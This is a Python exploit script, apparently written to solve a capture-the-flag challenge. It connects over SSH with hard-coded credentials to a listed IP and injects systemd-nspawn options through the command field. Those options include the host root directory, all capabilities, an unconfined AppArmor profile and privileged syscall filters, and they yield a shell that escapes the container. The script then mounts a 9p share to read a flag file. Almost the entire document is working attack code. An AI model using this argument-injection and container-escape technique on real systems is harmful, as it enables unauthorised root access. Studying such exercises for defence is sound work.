#!/usr/bin/env python3
import paramiko
import time
import sys

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASS = "123456"

def exec_cmd(cmd, username=USER, wait_after=2):
    """执行单个命令并正确关闭连接"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(HOST, PORT, username, PASS, timeout=10)
        stdin, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode()
        err = stderr.read().decode()
        return out, err, None
    except Exception as e:
        return None, None, str(e)
    finally:
        client.close()
        time.sleep(wait_after)  # 等待容器释放

def test_nspawn_options():
    """测试通过nspawn选项注入"""
    print("[*] 测试nspawn选项...")
    
    tests = [
        # (命令, 描述)
        # 组合命令 - 但需要避免shell特殊字符
        # 用 /bin/sh 来执行组合命令
        ("--volatile=yes --directory=/ --capability=all /bin/sh", "进入shell"),
    ]
    
    for cmd, desc in tests:
        print(f"\n{'='*50}")
        print(f"[*] {desc}")
        print(f"[*] 命令: {cmd}")
        
        out, err, exc = exec_cmd(cmd)
        
        if exc:
            print(f"[-] 异常: {exc}")
        else:
            if out:
                print(f"[+] stdout:\n{out}")
            if err:
                print(f"[!] stderr:\n{err}")


import base64

def get_flag():
    """Attempts to get flag using interactive shell with multiple strategies"""
    print("[*] Starting flag acquisition attempts (Interactive)...")

    # Strategy 6: Host Root + Unconfined AppArmor
    strategy_apparmor_cmd = (
        "--volatile=yes --directory=/ --capability=all "
        "--property=AppArmorProfile=unconfined "
        "--system-call-filter=@default "
        "--system-call-filter=@mount "
        "--system-call-filter=@file-system "
        "--system-call-filter=@privileged "
        "/bin/sh"
    )

    strategies = [
        (strategy_apparmor_cmd, "Strategy 6: Host Root + Unconfined AppArmor")
    ]
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for nspawn_cmd, desc in strategies:
        print(f"\n{'='*20} {desc} {'='*20}")
        print(f"[*] Command: {nspawn_cmd}")
        
        try:
            client.connect(HOST, PORT, USER, PASS, timeout=10)
            
            # Use get_pty=True to ensure nspawn has a terminal
            stdin, stdout, stderr = client.exec_command(nspawn_cmd, get_pty=True)
            
            # Commands to execute
            cmds = [
                "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "id",
                "mkdir -p /mnt",
                "cat /proc/self/attr/current", # Check AppArmor status
                "mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt",
                "echo 'Mount Exit Code: '$?",
                "ls -la /mnt",
                "cat /mnt/flag",
                "exit"
            ]
            
            # Give it a moment to start
            time.sleep(1)
            
            for cmd in cmds:
                print(f"[*] Sending: {cmd}")
                stdin.write(cmd + "\n")
                stdin.flush()
                time.sleep(1) # Wait for execution
                
                if stdout.channel.recv_ready():
                    output_chunk = stdout.channel.recv(4096).decode()
                    print(f"[>] Output:\n{output_chunk}")
            
            print("[*] Closing stdin...")
            stdin.channel.shutdown_write()
            
            print("[*] Reading remaining output...")
            final_out = stdout.read().decode()
            print(f"[>] Final Output:\n{final_out}")
            
            client.close()
            time.sleep(3) # Wait for container cleanup BEFORE next attempt
            
        except Exception as e:
            print(f"[-] Exception: {e}")
            if client: client.close()
            time.sleep(3)

    print("\n[*] All attempts finished.")

def test_mount_9p():
    """专门测试9p挂载"""
    print("\n[*] 专门测试9p挂载...")
    
    # 首先检查当前环境
    print("\n[1] 检查基础环境...")
    out, err, _ = exec_cmd("cat /proc/filesystems")
    print(f"文件系统:\n{out}")
    
    # 检查modules
    print("\n[2] 检查内核模块...")
    out, err, _ = exec_cmd("lsmod | grep 9p")
    print(f"9p模块:\n{out}")
    
    # 使用ephemeral + capability
    print("\n[3] 使用ephemeral+capability测试mount...")
    out, err, _ = exec_cmd(
        "cat /proc/self/status | grep Cap; echo '---'; mount -t 9p -o trans=virtio,version=9p2000.L flag /mnt 2>&1; ls -la /mnt/",
        username="--ephemeral --capability=all " + USER
    )
    print(f"输出:\n{out}")
    if err:
        print(f"错误:\n{err}")

if __name__ == "__main__":
    # 检查命令行参数更新端口
    if len(sys.argv) > 1:
        PORT = int(sys.argv[1])
    
    print(f"目标: {HOST}:{PORT}")
    print("=" * 50)
    
    # test_nspawn_options()
    get_flag()
